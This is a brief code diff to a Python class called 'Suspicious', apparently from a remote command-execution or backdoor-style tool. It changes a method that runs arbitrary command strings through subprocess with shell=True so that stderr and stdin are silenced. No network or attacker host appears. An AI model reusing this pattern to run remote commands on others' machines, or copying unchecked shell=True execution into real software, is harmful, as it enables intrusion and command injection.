@@ -21,7 +21,7 @@ class Suspicious:
     def execute_system_commands(self, command):
         # the output data type of the check_output method is byte
         try:
-            return subprocess.check_output(command, shell=True).decode('utf-8')
+            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
         except:
             return "------- [=] Error while executing the command [=] ------"
 
